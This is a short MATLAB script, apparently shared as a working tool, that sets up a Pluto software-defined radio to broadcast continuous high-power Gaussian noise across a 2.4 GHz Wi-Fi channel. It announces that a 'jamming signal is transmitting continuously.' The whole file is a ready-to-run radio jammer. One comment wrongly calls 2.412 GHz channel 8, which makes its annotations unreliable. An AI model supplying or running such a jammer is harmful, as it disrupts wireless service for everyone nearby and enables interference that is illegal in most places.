%best one works very fine

% Clear environment
clear; clc;

%% PARAMETERS
centerFreq = 2.412e9;           % Wi-Fi Channel 8 (adjust as needed)
sampleRate = 20e6;              % 20 MHz to cover full Wi-Fi channel
txGain     = 0;                 % Max transmit gain (0 = highest power)
numSamples = 2^18;              % Number of samples to generate
amplitude  = 0.5;               % Amplitude of complex noise

%% Pluto SDR Transmitter Setup
tx = sdrtx('Pluto', ...
    'CenterFrequency', centerFreq, ...
    'BasebandSampleRate', sampleRate, ...
    'Gain', txGain, ...
    'ChannelMapping', 1);

%% Generate Complex Gaussian Noise
txSignal = amplitude * (randn(numSamples,1) + 1j*randn(numSamples,1));

%% Transmit Repeatedly
transmitRepeat(tx, txSignal);
disp('✅ Jamming signal is transmitting continuously...');
